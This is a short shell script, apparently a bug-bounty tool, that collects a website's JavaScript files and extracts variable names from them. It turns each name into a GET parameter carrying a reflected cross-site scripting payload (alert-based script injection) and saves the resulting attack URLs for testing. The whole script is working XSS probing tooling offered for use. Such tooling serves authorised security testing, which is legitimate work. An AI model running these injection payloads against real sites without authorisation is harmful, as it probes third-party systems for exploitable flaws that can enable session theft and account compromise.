# Script to Extract All JS variables and use them for XSS through GET request
# By Rohit Soni Twitter: @rohit_sonii

# Working
# 1. Get all JS URLs
# 2. Fetch data of those JS URLs
# 3. Grep for all JS variables
# 4. Combine them with provided web URL to make GET requests with payload


# Get JS URLs from web URls
web="web" #default value
web=`cat scanURL | head -n 1 | cut -d '/' -f3`

getJS -input=scanURL -complete | grep -v "jquery" > $web-jsLinks
# Get parameters from JS URLs : START
cat $web-jsLinks | concurl -c 3
cd out
grep -Hnri "var" | cut -d ":" -f3 | cut -d "=" -f1 | sed 's/var//g' | sed 's/\$//g' | sed -e 's/^[[:space:]]*//g' | sed '/(/d' | sed -e 's/ *//g' | sed '/@/d' | sed '/{/d' | sed '/\//d' | sed '/*/d' | sed '/\./d' | sort -u > ../$web-params
cd ..
# Get parameters from JS URLs : END

#Combine web URLs with params for GET : START
cat scanURL | sed 's/$/?/' > $web-tempURLs
cat $web-params | sed 's/$/=";alert(1)\/\/"><scrIPt>alert(2)<\/SCript>/' > $web-tempParams
comb $web-tempURLs $web-tempParams > $web-GETurlsXSS
echo "Result saved in: $web-GETurlsXSS"
#Combine web URLs with params for GET : END

# Cleaning : START
rm -r out
rm -rf $web-tempParams $web-tempURLs
# Cleaning : END
